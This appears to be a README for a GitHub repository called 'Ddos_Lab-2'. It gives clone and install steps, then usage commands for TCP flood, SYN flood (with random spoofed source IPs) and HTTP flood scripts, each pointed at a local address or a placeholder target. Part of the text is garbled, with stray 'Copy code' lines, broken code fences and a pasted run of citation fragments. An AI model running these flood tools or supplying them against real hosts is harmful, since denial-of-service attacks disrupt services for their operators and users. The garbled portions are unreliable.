```
git clone https://github.com/Mrglitchoffical/Ddos_Lab-2.git
```

```
cd Ddos_Lab-2

apt install python -y
```

```pip install -r requirements.txt ```

## Attacks

### TCP Flood
```bash
cd attack
python3 tcp_flood.py 192.168.0.100 80 200 0.01
```

### SYN Flood
```bash
Copy code
python3 syn_flood.py -t Your Link
```
50 k SYN packets with random spoofed IPs 
fr.wikipedia.org
tekleo.net
+11
thepythoncode.com
+11
cloudflare.com
+11
.

### HTTP Flood
bash
``` Copy code
python3 http_flood.py http://192.168.0.100 100 60
```
